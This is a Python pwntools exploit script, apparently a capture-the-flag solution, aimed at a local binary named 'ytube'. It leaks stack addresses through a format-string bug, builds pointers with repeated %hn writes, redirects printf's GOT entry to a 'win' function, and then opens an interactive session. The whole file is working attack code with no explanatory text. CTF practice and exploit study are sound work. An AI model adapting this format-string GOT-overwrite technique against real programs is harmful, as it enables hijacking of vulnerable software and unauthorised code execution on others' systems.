#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('ytube')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
#rwatch *0xf7f58000
break *0x0804920D
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['tmux', 'splitw', '-h']
io = start()

def snd(s):
    io.sendline(str(s))
def rcv():
    return io.recvline()

if args.GDB:
    rcv()

snd("%4$p %13$p %14$p")
addr1, addr2, addr3 = rcv().strip().split(' ')
addr1 = int(addr1, 16)
addr2 = int(addr2, 16)
addr3 = int(addr3, 16)

# 13 -> 49
# 14 -> 51

fmt = "%{}x%{}$hn"
# target: write at addr1+12
to_write1 = (addr1 + 12) & 0xffff
to_write2 = (addr1 + 14) & 0xffff
snd(fmt.format(to_write1, 13))
rcv()
snd(fmt.format(to_write2, 14))
rcv()

to_write1 = exe.got['printf'] & 0xffff
to_write2 = (exe.got['printf'] >> 16) & 0xffff
#log.info(hex(to_write1))
#log.info(hex(to_write2))
snd(fmt.format(to_write1, 49))
rcv()
snd(fmt.format(to_write2, 51))
rcv()

# target: write at addr1+16
to_write1 = (addr1 + 16) & 0xffff
to_write2 = (addr1 + 18) & 0xffff
snd(fmt.format(to_write1, 13))
rcv()
snd(fmt.format(to_write2, 14))
rcv()

to_write1 = (exe.got['printf'] + 2)  & 0xffff
to_write2 = (exe.got['printf'] >> 16) & 0xffff
#log.info(hex(to_write1))
#log.info(hex(to_write2))
snd(fmt.format(to_write1, 49))
rcv()
snd(fmt.format(to_write2, 51))
rcv()

# printf got is at args 15 and 16
to_write1 = (exe.symbols['win']) & 0xffff
to_write2 = (exe.symbols['win'] >> 16) & 0xffff
#log.info(hex(to_write1))
#log.info(hex(to_write2))
snd("%{}x%{}$hn%{}x%{}$hn".format(to_write2, 16, to_write1 - to_write2, 15))
rcv()

snd('gnome-calculator')

io.interactive()
